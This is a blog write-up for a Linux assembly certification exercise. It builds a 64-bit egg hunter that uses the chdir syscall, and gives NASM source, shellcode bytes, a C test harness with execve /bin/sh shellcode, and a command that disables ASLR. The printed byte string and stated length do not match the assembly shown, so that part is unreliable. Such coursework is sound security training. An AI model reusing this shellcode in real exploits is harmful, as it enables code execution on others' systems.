Title: SLAE64 - Assignment 3
Date: 2022-06-25T08:51:58.000Z

<h2 id="disclaimer">Disclaimer</h2><p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification:</p><p><a href="https://www.pentesteracademy.com/course?id=7">https://www.pentesteracademy.com/course?id=7</a></p><p>Student ID: PA-30398</p><h2 id="source-code">Source Code</h2><p>The files for this assignment are:</p><ul><li><a href="https://github.com/rbctee/SlaeExam/blob/main/slae64/assignment/3/egghunter.nasm">egghunter.nasm</a>, the NASM file containing the assembly code for the egg hunter</li><li><a href="https://github.com/rbctee/SlaeExam/blob/main/slae64/assignment/3/test_egghunter.c">test_egghunter.c</a>, the C program for testing the egg hunter shellcode</li><li><a href="https://github.com/rbctee/SlaeExam/blob/main/slae64/assignment/3/test_egghunter_specific_address.c">test_egghunter_specific_address.c</a>, a modified version of the C program, in which the shellcode starts from a specific address to speed up the process</li></ul><h2 id="theory">Theory</h2><p>Now comes the question: what is an <em>Egg Hunter</em>?</p><p>According to a paper titled <em><a href="https://www.exploit-db.com/docs/english/18482-egg-hunter---a-twist-in-buffer-overflow.pdf">Egg Hunter - A twist in Buffer Overflow</a> </em>published by Ashfaq Ansari on <code>Exploit-DB</code>:</p><blockquote>The Egg hunting technique is used when there are not enough available consecutive memory locations to insert the shellcode. Instead, a unique "tag" is prefixed with shellcode.</blockquote><blockquote>When the "Egg hunter" shellcode is executed, it searches for the unique "tag" that was prefixed with the large payload and starts the execution of the payload.</blockquote><h2 id="practice">Practice</h2><h3 id="design-choices">Design Choices</h3><p>To implement an egg-hunter for x64 Linux systems, I'm referring to the <a href="http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf">same whitepaper</a> I used for the previous SLAE32 exam. It shows some techniques you can employ in your own implementation.</p><p>Since the <em>SIGSEGV handler technique</em> is considered <em>infeasible </em>mainly due to its size, I decided to use instead the <em>system call technique.</em></p><p>As the name implies, it's based on the usage of system calls to scan the memory of the process in search of the so-called <em>egg</em>.</p><p>Given the fact that size is very important in egg-hunter shellcodes, we would need syscalls that do not require complex data structures. The best case is a <em>idempotent </em>syscall that accepts a single pointer argument.</p><p>For this reason, I performed some <strong>grep </strong>searches on the man pages installed on my system, and I discovered a few matches:</p><figure class="kg-card kg-code-card"><pre><code class="language-bash"># Requirements:
- sudo apt install manpages-dev
- sudo find /usr/share/man2/ -type f -name "*.gz" -exec sh -c "gunzip {}" \;
- cd /usr/share/man2

grep -RiE '\(const char\s*?\*"\s[a-zA-Z]*\s*\)'

# chroot.2:.BI "int chroot(const char *" path );
# unlink.2:.BI "int unlink(const char *" pathname );
# delete_module.2:.BI "   int delete_module(const char *" name );
# umount.2:.BI "int umount(const char *" target );
# rmdir.2:.BI "int rmdir(const char *" pathname );
# acct.2:.BI "int acct(const char *" filename );
# chdir.2:.BI "int chdir(const char *" path );
# swapon.2:.BI "int swapoff(const char *" path );
# uselib.2:.BI "int uselib(const char *" library );
</code></pre><figcaption>Findings syscalls accepting one pointer argument</figcaption></figure><p>Theoretically, all of them should allow me to test whether a given memory address is valid.</p><p>However, I chose to use the syscall <code>chdir</code>, since it wouldn't cause too many changes to the program as compared to <code>unlink</code> and <code>rmdir</code> which seem far more dangerous.</p><p>Follows the function prototype of the syscall <code>chdir</code>:</p><figure class="kg-card kg-code-card"><pre><code class="language-cpp">#include &lt;unistd.h&gt;

int chdir(const char *path);</code></pre><figcaption>Function prototype of the syscall <code>chdir</code></figcaption></figure><p>As you can see, it accept a single pointer argument.</p><p>All it does is try to change the <em>Current Working Directory</em> (<code>CWD</code>) to the path the argument <code>path</code> points to.</p><p>Since it accepts a pointer, we can use it to test memory addresses. </p><p>Moreover, given that it already implements a <em>SIGSEGV handler</em>, the syscall won't throw a <code>SIGSEGV</code> error and crash the program.</p><p>Instead, it will return the error <code>EFAULT</code> (<code>0xfffffff2</code>), indicating that a bad address was passed as the argument of the syscall.</p><h3 id="assembly-code">Assembly Code</h3><p>Follows my implementation in Assembly language:</p><figure class="kg-card kg-code-card"><pre><code class="language-nasm">; Author: Robert Catalin Raducioiu

global _start

section .text

_start:

    ; start searching for the egg from the address 0x0
    xor edi, edi

NextPage:

    ; go to the next memory page (each one is 0x1000 bytes)
    or di, 0xfff
    
    ; go to the next memory address
    inc rdi

CheckAddress:

    ; call the syscall 80 (chdir)
    xor eax, eax
    mov al, 80
    syscall

    ; check if the last byte of RAX is equal to the last byte
    ; of the error EFAULT (0xfffffff2)
    cmp al, 0xf2
    jz NextPage

    ; set EAX to the egg
    mov eax, 0x74636273
    dec eax

    ; compare the egg with the bytes pointed to by RDI
    ; also increase RDI by 4
    scasd

    ; if it is not the egg, then go back and check the next address
    jnz CheckAddress

    ; jump at the beginning of the actual shellcode
    call rdi</code></pre><figcaption>Egg Hunter Shellcode</figcaption></figure><p>Note that the <code>CheckBytes</code> routine does not contain an exact copy of the egg, however it's slightly modified, in this case the last byte is increased by <code>0x1</code>.</p><p>Therefore, in order to calculate the real egg, it uses the assembly instruction <code>DEC</code> to decrease the value of the modified egg.</p><p>This was done to avoid another exact occurrence of the egg, which could lead to the egg hunter finding the latter instead of the egg prepended to the shellcode.</p><p>To obtain the shellcode from the previous assembly program, you can use these instructions:</p><figure class="kg-card kg-code-card"><pre><code class="language-bash">nasm -f elf64 egghunter.nasm
objcopy -O binary -j .text egghunter.o /dev/stdout | od -An -t x1  | tr -d '\n' | sed -r 's/^ |$/"/g;s/\s?([0-9a-f]{2})/\\x\1/g'

# Result:
# "\x31\xff\x48\xf7\xe7\x66\x81\xcf\xff\x0f\x48\xff\xc7\x31\xc0\xb0\x50\x0f\x05\x3c\xf2\x74\xee\x8b\x17\xbe\x73\x62\x63\x74\xff\xce\x39\xf2\x75\xe6\x48\x83\xc7\x04\xff\xd7"</code></pre><figcaption>Egghunter shellcode</figcaption></figure><h3 id="testing">Testing</h3><p>During my tests, I noticed that a long period of time was required for the egg hunter to find the egg and execute the real shellcode. This is caused by the usage of 64-bits memory addresses.</p><p>In fact, while most of the x86 systems have 32 bits for virtual addresses, x86-64 systems have 48 bits.</p><!--kg-card-begin: markdown--><table>
<thead>
<tr>
<th>System</th>
<th>Number of memory pages</th>
</tr>
</thead>
<tbody>
<tr>
<td>x86</td>
<td>2^32 / 0x1000 = 1.048.576</td>
</tr>
<tr>
<td>x86-64</td>
<td>2^48 / 0x1000 = 68.719.476.736</td>
</tr>
</tbody>
</table>
<!--kg-card-end: markdown--><p>From the table above, we can see that it takes 68.000 more times to scan all the virtual addresses in a x86-64 process.</p><p>Time-wise, to find an egg in a 64-bit process I would have to wait more than 10 hours, while it would take some seconds/minutes in 32-bit processes.</p><p>For testing purposes, I chose to speed up the process by starting from an address closer to the location of the real shellcode.</p><p>To do this, first I had to disable <strong>ASRL </strong>(<em>Address Space Layout Randomization</em>) on my Linux host:</p><figure class="kg-card kg-code-card"><pre><code class="language-bash">echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

# to enable it again:
# echo 2 | sudo tee /proc/sys/kernel/randomize_va_space</code></pre><figcaption>Disabling ASLR on Linux</figcaption></figure><p>After that, I wrote a simple C program to test the egghunter shellcode:</p><figure class="kg-card kg-code-card"><pre><code class="language-cpp">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

#define EGG "\x72\x62\x63\x74"

void main(int argc, char* argv[])
{
    /*
    Shellcode for spawning /bin/sh, with the egg prepended
    */
    unsigned char shellcode[] = EGG "\x31\xc0\x50\x48\x89\xe2\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x83\xc0\x3b\x0f\x05";

    unsigned char egghunter[] = "\x31\xff\x48\xf7\xe7\x66\x81\xcf\xff\x0f\x48\xff\xc7\x31\xc0\xb0\x50\x0f\x05\x3c\xf2\x74\xee\x8b\x17\xbe\x73\x62\x63\x74\xff\xce\x39\xf2\x75\xe6\x48\x83\xc7\x04\xff\xd7";

    printf("[+] Shellcode length: %d\n", strlen(shellcode));
    printf("[+] Egg-hunter length: %d\n", strlen(egghunter));

    int (*ret)() = (int(*)())egghunter;
    ret();
}

</code></pre><figcaption>Program for testing the egghunter</figcaption></figure><p>Next, I compiled it with gcc:</p><figure class="kg-card kg-code-card"><pre><code class="language-bash">gcc -w -o test_egghunter -zexecstack ./test_egghunter.c</code></pre><figcaption>Compiling the testing program</figcaption></figure><p>As previously assumed, once I ran the program, it didn't spawn a shell, but it would require many hours of time.</p><p>Since the real shellcode is stored on the stack (hence a local variable within the main function), I decided to retrieve the starting address of the stack and increase the <code>RDI</code> register of the egghunter shellcode by this value. </p><p>Doing so, the testing program would be able to find the egg, and execute the real shellcode in a matter of seconds.</p><p>First things first, to retrieve the starting address of the stack I ran the commands below while the testing program was still running:</p><figure class="kg-card kg-code-card"><pre><code class="language-bash"># get the PID of the testing program
ps aux | grep test_egghunter
# kali       21105 98.6  0.0   2424   680 pts/1    R+   05:47   0:38 ./test_egghunter

# get the base address of the stack
cat /proc/21105/maps
# 7ffffffde000-7ffffffff000 rwxp 00000000 00:00 0            [stack]</code></pre><figcaption>Retrieving the base address of the stack from the running program</figcaption></figure><p>After that, I added the following line to the NASM program:</p><figure class="kg-card kg-code-card"><pre><code class="language-diff">--- egghunter.nasm	2022-06-26 08:42:28.986705942 -0400
+++ egghunter_fast.nasm	2022-06-26 08:42:35.690706235 -0400
@@ -8,6 +8,7 @@
 
     ; start searching for the egg from the address 0x0
     xor edi, edi
+    mov rdi, 0x7fffffff0000
 
 NextPage:</code></pre><figcaption>Speeding up the egghunter shellcode</figcaption></figure><p>Running again the testing program with the new egghunter shellcode, the latter successfully found the egg, and passed the execution to the real shellcode, which spawned a simple <code>/bin/sh</code> shell.</p><p>The following figure demonstrates the result: </p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="__GHOST_URL__/content/images/2022/07/image-2.png" class="kg-image" alt loading="lazy" width="1477" height="483" srcset="__GHOST_URL__/content/images/size/w600/2022/07/image-2.png 600w, __GHOST_URL__/content/images/size/w1000/2022/07/image-2.png 1000w, __GHOST_URL__/content/images/2022/07/image-2.png 1477w" sizes="(min-width: 720px) 720px"><figcaption>Successful execution of the shellcode</figcaption></figure><p>Note that in this case the length of the egg hunter shellcode is wrong due to the function <code>strlen</code> not being able to calculate the length of the shellcode, as the latter contains some <code>NULL</code> bytes.</p><p><strong>Without</strong> the last modification (<code>mov rdi, 0x7fffffff0000</code>), the actual length of the egg hunter shellcode is <strong>32 bytes</strong>.</p><p>Please refer to the paragraph <em>Source Code</em> if you want to C code with the egg hunter shellcode starting from a specific address.</p>